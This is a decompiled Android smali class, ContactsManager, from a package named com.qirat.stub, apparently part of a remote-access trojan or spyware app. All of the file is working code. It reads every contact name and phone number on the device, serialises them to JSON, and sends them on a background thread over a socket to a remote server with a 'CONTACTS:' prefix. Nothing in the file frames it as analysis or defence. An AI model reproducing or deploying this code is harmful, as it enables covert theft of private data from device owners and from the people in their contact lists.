.class public Lcom/qirat/stub/ContactsManager;
.super Ljava/lang/Object;
.source "ContactsManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "ContactsManager"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getContacts(Landroid/content/Context;)Lorg/json/JSONObject;
    .locals 13
    .param p0, "context"    # Landroid/content/Context;

    .line 17
    const-string v0, "data1"

    const-string v1, "display_name"

    const-string v2, "ContactsManager"

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 18
    .local v3, "contacts":Lorg/json/JSONObject;
    new-instance v4, Lorg/json/JSONArray;

    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V

    .line 19
    .local v4, "list":Lorg/json/JSONArray;
    const/4 v5, 0x0

    .line 21
    .local v5, "cur":Landroid/database/Cursor;
    const/4 v6, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    filled-new-array {v1, v0}, [Ljava/lang/String;

    move-result-object v9

    const-string v12, "display_name ASC"

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    move-object v5, v7

    .line 29
    if-nez v5, :cond_1

    .line 30
    const-string v0, "Cursor is null."

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 31
    nop

    .line 49
    if-eqz v5, :cond_0

    .line 50
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 31
    :cond_0
    return-object v6

    .line 34
    :cond_1
    :goto_0
    :try_start_1
    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v7

    if-eqz v7, :cond_2

    .line 35
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 36
    .local v7, "contact":Lorg/json/JSONObject;
    invoke-interface {v5, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v5, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 37
    .local v8, "name":Ljava/lang/String;
    invoke-interface {v5, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v5, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 39
    .local v9, "num":Ljava/lang/String;
    const-string v10, "name"

    invoke-virtual {v7, v10, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 40
    const-string v10, "phoneNo"

    invoke-virtual {v7, v10, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 41
    invoke-virtual {v4, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 42
    nop

    .end local v7    # "contact":Lorg/json/JSONObject;
    .end local v8    # "name":Ljava/lang/String;
    .end local v9    # "num":Ljava/lang/String;
    goto :goto_0

    .line 43
    :cond_2
    const-string v0, "contactsList"

    invoke-virtual {v3, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 44
    const-string v0, "Contacts collection complete."

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 45
    nop

    .line 49
    if-eqz v5, :cond_3

    .line 50
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 45
    :cond_3
    return-object v3

    .line 49
    :catchall_0
    move-exception v0

    goto :goto_2

    .line 46
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    .line 47
    .local v0, "e":Ljava/lang/Exception;
    :goto_1
    :try_start_2
    const-string v1, "Error getting contacts list"

    invoke-static {v2, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 49
    nop

    .end local v0    # "e":Ljava/lang/Exception;
    if-eqz v5, :cond_4

    .line 50
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 53
    :cond_4
    return-object v6

    .line 49
    :goto_2
    if-eqz v5, :cond_5

    .line 50
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 52
    :cond_5
    throw v0
.end method

.method static synthetic lambda$sendContactsToServer$0(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .line 62
    invoke-static {p0}, Lcom/qirat/stub/ContactsManager;->getContacts(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v0

    .line 63
    .local v0, "contactsList":Lorg/json/JSONObject;
    const-string v1, "ContactsManager"

    if-nez v0, :cond_0

    .line 64
    const-string v2, "Cannot send contacts list, the collected list is null."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 65
    return-void

    .line 69
    :cond_0
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v2

    .line 70
    .local v2, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v2}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 71
    const-string v3, "Sending contacts list to server..."

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "CONTACTS:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 74
    :cond_1
    const-string v3, "Cannot send contacts list, socket not connected."

    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    :goto_0
    return-void
.end method

.method public static sendContactsToServer(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 61
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/ContactsManager$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/ContactsManager$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 76
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 77
    return-void
.end method
